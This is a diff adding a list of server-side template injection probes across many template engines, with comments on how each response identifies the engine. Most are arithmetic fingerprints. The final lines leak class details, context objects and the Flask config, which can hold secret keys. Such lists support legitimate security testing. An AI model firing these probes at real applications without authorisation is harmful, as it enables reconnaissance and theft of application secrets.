@@ -1,0 +1,19 @@
+# Multi-engine SSTI fingerprint probes. Inject each individually, observe what renders.
+# Distinguishing comments at the end of each line.
+{{7*7}}                    # Jinja2, Twig, Liquid, Nunjucks: render 49
+{{7*'7'}}                  # Jinja2: 7777777   |  Twig: 49   (most reliable J2-vs-Twig differentiator)
+${7*7}                     # Velocity, Freemarker, Mako, Thymeleaf (some), JSP EL: render 49
+#{7*7}                     # Pug (Node), Ruby string interpolation in some contexts: 49
+*{7*7}                     # Smarty, Thymeleaf-spring (older): 49
+<%= 7*7 %>                 # ERB (Ruby), EJS (Node): 49
+<%=7*7%>                   # Same as above, no spaces
+[[${7*7}]]                 # Thymeleaf: 49
+%{7*7}                     # Struts2 OGNL: 49 (often only in specific contexts)
+{php}echo 7*7;{/php}       # Old Smarty: 49
+{{= 7*7 }}                 # Underscore / lodash templates: 49
+{{7*7}}-{{8*8}}            # Combined probe — easier to spot in noisy output
+${{<%[%'"}}%\.              # Polyglot break — engines that can't parse this throw a distinctive error
+${"foo".getClass()}        # Velocity/Freemarker: leaks Java class name (class java.lang.String)
+{{ ''.__class__ }}         # Jinja2: leaks <class 'str'>
+{{config}}                 # Jinja2/Flask: dumps the Flask app config object
+{{self}}                   # Jinja2: dumps context
